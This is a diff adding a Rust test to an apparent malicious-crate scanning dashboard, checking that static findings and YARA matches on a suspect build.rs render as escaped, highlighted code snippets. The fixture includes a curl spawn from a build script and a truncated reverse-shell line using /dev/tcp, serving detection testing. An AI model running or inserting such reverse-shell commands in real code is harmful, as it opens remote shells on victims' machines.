@@ -584,3 +584,86 @@ async fn an_unknown_job_is_not_found() {
     assert_eq!(db.get("/jobs/999").await, (404, "no such job".to_owned()));
     db.drop().await;
 }
+
+/// The lines of the code block after `marker`, as number and text, with
+/// the highlighted line marked by `>`.
+fn snippet(html: &str, marker: &str) -> Vec<String> {
+    let after = &html[html.find(marker).unwrap()..];
+    let start = after.find("<pre class=\"code\">").unwrap();
+    let end = start + after[start..].find("</pre>").unwrap();
+    after[start..end]
+        .split("<span class=\"ln\">")
+        .skip(1)
+        .map(|line| {
+            let (number, rest) = line.split_once("</span>").unwrap();
+            let hit = if rest.contains("hit\">") { ">" } else { " " };
+            let (_, text) = rest.split_once("\">").unwrap();
+            let text = unescape(text.split("</span>").next().unwrap());
+            format!("{hit}{number} {text}")
+        })
+        .collect()
+}
+
+#[tokio::test]
+async fn static_evidence_shows_the_code_around_it() {
+    let Some(db) = Dashboard::start().await else {
+        return;
+    };
+    let job = db.job().await;
+    let spawn = evidence(
+        "static:process_spawn",
+        30,
+        EvidenceSource::Static,
+        "high severity process_spawn in build_script code",
+        Some("evil"),
+        Some("build.rs:3"),
+    );
+    // A verdict from before YARA matches had a line names only the file.
+    let yara = evidence(
+        "static:yara:reverse_shell",
+        10,
+        EvidenceSource::Static,
+        "reverse shell",
+        Some("evil"),
+        Some("build.rs"),
+    );
+    let mut v = verdict();
+    v.evidence = vec![spawn, yara];
+    db.store.record_verdict(job, &v).await.unwrap();
+    db.store.record_crate_file(&crate_file()).await.unwrap();
+    let report = json!({"findings": [
+        {"severity": "high", "kind": "process_spawn", "file": "build.rs", "line": 3,
+         "evidence": "Command::new", "snippet": {"start": 1, "lines": [
+            "fn main() {", "    let url = \"<https://x.invalid>\";", "    Command::new(\"curl\").arg(url);", "}"]}},
+        {"severity": "high", "kind": "yara_match", "rule": "reverse_shell", "file": "build.rs",
+         "line": 9, "evidence": "reverse shell", "snippet": {"start": 8, "lines": ["// a", "sh -i >& /dev/tcp/x"]}},
+        {"severity": "low", "kind": "process_spawn", "file": "src/lib.rs", "line": 3, "evidence": "other"}
+    ]});
+    let cksum = CKSUM.parse().unwrap();
+    let recorded = db
+        .store
+        .record_static_report(&cksum, 4, true, None, &report);
+    recorded.await.unwrap();
+
+    let html = db.page(job).await;
+    let evidence = &html
+        [html.find("<h2>Evidence</h2>").unwrap()..html.find("<h2>Static findings</h2>").unwrap()];
+    assert_eq!(
+        snippet(evidence, "static:process_spawn"),
+        [
+            " 1 fn main() {",
+            " 2     let url = \"<https://x.invalid>\";",
+            ">3     Command::new(\"curl\").arg(url);",
+            " 4 }"
+        ]
+    );
+    assert!(!evidence.contains("<https"), "the code is escaped");
+    assert_eq!(
+        snippet(evidence, "static:yara:reverse_shell"),
+        [" 8 // a", ">9 sh -i >& /dev/tcp/x"]
+    );
+    let findings = &html[html.find("<h2>Static findings</h2>").unwrap()..];
+    assert_eq!(findings.matches("<details>").count(), 2);
+    assert_eq!(snippet(findings, "<details>").len(), 4);
+    db.drop().await;
+}
